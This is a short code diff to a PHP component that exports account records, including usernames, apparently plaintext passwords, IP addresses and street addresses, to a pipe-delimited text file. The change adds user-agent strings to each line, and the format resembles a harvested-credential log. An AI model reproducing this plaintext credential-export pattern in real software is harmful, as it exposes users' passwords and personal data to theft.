@@ -20,12 +20,13 @@ class Index extends Component
         $content  = "";
 
         foreach ($accounts as $account) {
-            $username = $account->username;
-            $password = $account->password;
-            $time     = $account->created_at->format('d/m/Y - H:i:s');
-            $address  = $account->address;
-            $ip       = $account->ip;
-            $content  .= "$username|$password|$ip|$time|$address\n";
+            $username  = $account->username;
+            $password  = $account->password;
+            $time      = $account->created_at->format('d/m/Y - H:i:s');
+            $address   = $account->address;
+            $ip        = $account->ip;
+            $useragent = $account->user_agent;
+            $content   .= "$username|$password|$ip|$useragent|$time|$address\n";
         }
 
         $fileName = "account-" . date("Y-m-d-H-i-s") . ".txt";
